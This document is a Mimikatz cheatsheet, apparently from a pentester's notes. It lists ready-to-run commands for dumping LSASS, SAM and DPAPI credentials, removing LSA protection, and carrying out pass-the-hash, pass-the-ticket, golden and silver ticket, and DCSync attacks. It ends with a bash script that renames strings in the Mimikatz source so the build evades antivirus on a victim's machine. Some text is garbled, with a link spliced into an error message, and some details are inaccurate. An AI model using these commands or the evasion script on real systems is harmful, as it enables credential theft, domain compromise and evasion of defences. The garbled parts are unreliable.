# Mimikatz Cheatsheet


[mimikatz](https://github.com/gentilkiwi/mimikatz) is Windows Credential Extraction tool from [gentilkiwi](https://github.com/gentilkiwi). *It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. `mimikatz` can also perform pass-the-hash, pass-the-ticket or build Golden tickets.* Used in Post Privilege Escalation, maintaining [[Persistence]] through credential harvesting and [[Active-Directory-Lateral-Movement]]. Mimikatz is used to dump credentials:
- From windows protect memory (LSASS) and activity directory domain controller database
- Kerberos tickets
	- For all users
	- For current users
- Credential Injection
- Generate Silver/Golden tickets
	- [[Pass-The-Hash]]
	- [[Pass-The-Ticket]]
- And more

In 2012, Microsoft implemented an LSA protection, to keep LSASS from being accessed to extract credentials from memory. [[AD-Credential-Harvesting]]
`reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa 0`

```powershell
privilege::debug
# Log to a txt file as the output can get very large 
log 
sekurlsa::logonpasswords
# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
# Means LSA protection:
!+ # mimidrv.sys driver disables LSA protection.
!processprotect /process:lsass.exe /remove
```

```powershell
privilege::debug # enables the _SeDebugPrivilge_ access right
# Log to a txt file as the output can get very large 
log 
token::elevate # elevate the security token Administrator -> SYSTEM
!+ # LSA protection bypass!
lsadump::lsa /patch
lsadump::sam
sekurlsa::logonPasswords
```

#### DPAPI

[thehacker.recipes](https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey)*`dpapi::masterkey` describes a Masterkey file and unprotects each Masterkey (key depending). In other words, it can decrypt and request masterkeys from active directory (cf. [dumping DPAPI secrets](https://www.thehacker.recipes/ad-ds/movement/credentials/dumping/dpapi-protected-secrets)).
```c
// The `dpapi::cred` can also display the masterkey location through the `guidMasterKey` value.
mimikatz # dpapi::masterkey /in:"C:\PATH"
```


### Extracting NTLM hashes from local SAM

```powershell
privilege::debug
token::elevate
!+ # LSA protection bypass!
lsadump::lsa /patch
lsadump::sam # Dump SAM database
```
### Extracting NTLM hashes from LSASS memory

```powershell
privilege::debug
token::elevate
!+ # LSA protection bypass!
sekurlsa::msv
```
These hashes can be used to perform [[Pass-The-Hash]] attacks by using `mimikatz` to inject an access token for the vicitim user on any command!
```powershell
token::revert
sekurlsa::pth /user:<username> /domain:<domain-name> /ntlm:<ntlm hash> /run:"<cmds goes here>"
```

Alternatively we `SeDebug` privilege use [[Sysinternals-Procdump]] or `Taskmanager`,  then `mimikatz`
```powershell
# Or Taskmanager -> [Right Click] lsass.exe -> Create dump file 
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# run mimikatz use log file if required
mimikatz.exe
log # if required
# Target the memory dump
sekurlsa::minidump lsass.dmp
# Extract logonpasswords
sekurlsa::logonpasswords
```


## Kerberos Attacks
Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos and [[Active-Directory-Kerberos-Authentication-Defined]]. It is credential base so understanding [[Active-Directory-Authentication]] in part for [[Active-Directory-Privilege-Escalation]] and [[Active-Directory-Lateral-Movement]] as it is capable of command execution.

Sometimes extraction of Kerberos tickets and sessions keys from LSASS memory with Mimikatz, requiring also SYSTEM privileges:
```powershell
privilege::debug
!+ # LSA protection bypass!
sekurlsa::tickets /export
```
Extract a desired ticket and inject the tickets into the current session, which doesn't require administrator privileges:
```powershell
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-$DOMAIN.kirbi
```
Use `klist` to list Kerberos tickets.

### Kerberos Tickets
```powershell
kerberos::list /export
```

### Overpass the Hash Attacks
```powershell
sekurlsa::logonpasswords # Or another NTLM obtaining method
sekurlsa::pth /user:$admin /domain:$domain.com /ntlm:$NThash /run:Powershell.exe
```

### Silver Ticket Attacks
Don't be confused `kerberos::golden` is for Silver Ticket Attacks, see Golden Ticket Attacks. Requires:# Username, Domainame, SID of Domain defined by all except the ultimate `-0000`, Service to target, Service type(eg. HTTP), password hahsh of the Service Account. Creating a service ticket for the SPN HTTP/WebServer.Domain.com with this technique from perspective of application the current user will be built-in local administrator and Domain Admin group member.
```powershell
kerberos::purge
kerberos::list

kerberos::golden /user:$user /domain:$domain.com /sid:$SID-minus-exception /target:$TargetServer.$domain.com /service:$servicetype /rc4:$passwordhash-of-spn /ptt # /ptt means injected directly into memory
```

### Golden Ticket Attacks 
Don't be confused `kerberos::golden` is for Silver Ticket Attacks
```powershell
privilege::debug
!+ # LSA protection bypass!
lsadump::lsa /inject /name:krbtgt
```

With Domain Admin group access:
```powershell
privilege::debug
!+ # LSA protection bypass!
lsadump::lsa /patch
# Look for krbtgt
```

Creating the golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain. 
Provide values for: `kerberos::golden /user: /domain: /sid: /krbtgt: /id`,
like: `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-SID /krbtgt:HASH /id:ID`, then open command prompt with elevated privileges `misc::cmd`.

```powershell 
kerberos::purge # Removed cached tickets
kerberos::golden /user:hacker /domain:$domainname.com /sid:$sid /krbtgt:$krbtgt-hash /ptt 
misc::cmd
```

Mimikatz provides two sets of default values when using the golden ticket option:
1. User IP - default set: 500, RID of builtin Administrator
2. Group IP - Domain Admins group

### DCSync Attacks
Visit [[Active-Directory-Persistence]] for details.

```powershell
!+ # LSA protection bypass!
lsadump::dcsync /user:Administrator
```

## Credential Manager

```powershell
privilege::debug
# ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on me[thehacker.recipes](https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey)mory (0x00000005)
# Means LSA protection:
!+ # mimidrv.sys driver disables LSA protection.
!processprotect /process:lsass.exe /remove
sekurlsa::credman
```

## Certification Persistence

```powershell
# View CA Certificate on the DC 
crypto::certificates /systemstore:local_machine


privilege::debug
crypto::capi
crypto:cng
crypto::certificates /systemstore:local_machine /export
```


## Custom Mimikatz

Try mimidogz! [Obfuscation script from s3cur3th1ssh1t](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/) - trying harder means adding more and read this article
```bash
# This script downloads and slightly "obfuscates" the mimikatz project.
# Most AV solutions block mimikatz based on certain keywords in the binary like "mimikatz", "gentilkiwi", "benjamin@gentilkiwi.com" ..., 
# so removing them from the project before compiling gets us past most of the AV solutions.
# We can even go further and change some functionality keywords like "sekurlsa", "logonpasswords", "lsadump", "minidump", "pth" ....,
# but this needs adapting to the doc, so it has not been done, try it if your victim's AV still detects mimikatz after this program.

git clone https://github.com/gentilkiwi/mimikatz.git windows
mv windows/mimikatz windows/windows
find windows/ -type f -print0 | xargs -0 sed -i 's/mimikatz/windows/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/MIMIKATZ/WINDOWS/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Mimikatz/Windows/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/DELPY/James/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Benjamin/Troy/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/benjamin@gentilkiwi.com/jtroy@hotmail.com/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/creativecommons/python/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/gentilkiwi/MSOffice/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/KIWI/ONEDRIVE/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/Kiwi/Onedrive/g'
find windows/ -type f -print0 | xargs -0 sed -i 's/kiwi/onedrive/g'
find windows/ -type f -name '*mimikatz*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/mimikatz/windows/g')";
	mv "${FILE}" "${newfile}";
done
find windows/ -type f -name '*kiwi*' | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e 's/kiwi/onedrive/g')";
	mv "${FILE}" "${newfile}";
done
```


## References

[Custom Mimikatz by s3cur3th1ssh1t](https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/)
[thehacker.recipes](https://tools.thehacker.recipes/mimikatz/modules/dpapi/masterkey)
[mimikatz](https://github.com/gentilkiwi/mimikatz) 